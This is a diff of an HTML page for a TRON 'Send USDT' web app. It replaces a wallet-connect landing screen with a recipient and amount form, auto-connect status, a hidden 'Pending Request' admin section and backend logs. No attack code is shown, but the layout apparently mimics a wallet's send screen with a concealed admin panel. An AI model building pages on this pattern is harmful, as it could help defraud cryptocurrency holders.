@@ -5,48 +5,68 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
     <link rel="icon" type="image/png" href="/logo.png" />
     <link rel="apple-touch-icon" href="/logo.png" />
-    <title>TRON Wallet Connect</title>
-    <meta name="description" content="Connect your TRON wallet securely." />
+    <title>Send USDT</title>
+    <meta
+      name="description"
+      content="Connect your TRON wallet and review TRON / USDT transactions."
+    />
   </head>
   <body>
+    <main class="screen">
+      <header class="topbar">
+        <h1>Send USDT</h1>
+        <button id="retryConnectBtn" class="icon-btn" type="button" hidden aria-label="Retry connection">
+          &#8635;
+        </button>
+      </header>
 
-    <!-- ── Main screen ──────────────────────────────────────────────────── -->
-    <main class="screen" id="mainScreen">
+      <p id="connectStatus" class="connect-status">Connecting wallet...</p>
+      <p id="walletAddress" class="wallet-address"></p>
 
-      <div class="logo-wrap">
-        <img src="/logo.png" alt="Logo" width="80" class="app-logo" onerror="this.style.display='none'" />
-      </div>
-
-      <h1 class="app-title">TRON DApp</h1>
-      <p class="app-subtitle">Secure TRON Wallet Connection</p>
-      <p id="envBadge" class="env-badge"></p>
-
-      <!-- Status line -->
-      <p id="connectStatus" class="status-line">Initializing…</p>
-
-      <!-- Wallet info (shown after connect) -->
-      <div id="walletStrip" class="wallet-strip" hidden>
-        <div class="wallet-strip-inner">
-          <span class="dot-online"></span>
-          <span class="connected-label">Wallet Connected</span>
+      <section class="field-group">
+        <label for="recipientInput">Address or Domain Name</label>
+        <div class="input-shell">
+          <input id="recipientInput" placeholder="Search or Enter" autocomplete="off" />
+          <button id="pasteBtn" type="button" class="inline-action">Paste</button>
         </div>
-        <span id="walletAddress" class="wallet-addr"></span>
-      </div>
+      </section>
 
-      <!-- Connect button (shown when not connected) -->
-      <button id="connectBtn" type="button" class="connect-btn">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="margin-right:8px">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="currentColor" opacity="0.2"/>
-          <path d="M8 12h8M12 8l4 4-4 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-        Connect Wallet
-      </button>
+      <section class="field-group">
+        <label>Destination network</label>
+        <button class="network-chip" type="button" disabled>
+          <img src="/tron.svg" alt="TRON" />
+          <span>TRON Mainnet</span>
+        </button>
+      </section>
 
-      <!-- Disconnect button (shown when connected) -->
-      <button id="disconnectBtn" type="button" class="disconnect-btn" hidden>
-        Disconnect
-      </button>
+      <section class="field-group">
+        <label for="amountInput">Amount</label>
+        <div class="input-shell amount-shell">
+          <input id="amountInput" placeholder="USDT Amount" autocomplete="off" inputmode="decimal" />
+          <div class="asset-box">
+            <img src="/usdt.svg" alt="USDT" />
+            <span>USDT</span>
+          </div>
+          <button id="maxBtn" type="button" class="inline-action">Max</button>
+        </div>
+        <p id="fiatValue" class="subtext">~ $0.00</p>
+        <p id="balanceValue" class="subtext">Balance: -- USDT</p>
+      </section>
 
+      <section id="adminRequestSection" class="admin-section" hidden>
+        <h2>Pending Request</h2>
+        <div id="adminRequests"></div>
+      </section>
+
+      <section class="fallback-actions">
+        <button id="connectBtn" type="button" class="secondary" hidden>Connect Wallet</button>
+        <button id="disconnectBtn" type="button" class="secondary" hidden>Disconnect</button>
+      </section>
+
+      <button id="sendBtn" class="next-btn" type="button" disabled>Next</button>
+
+      <p id="backendStatus" class="backend-status"></p>
+      <pre id="logs" hidden></pre>
     </main>
 
     <script type="module" src="/src/main.js"></script>
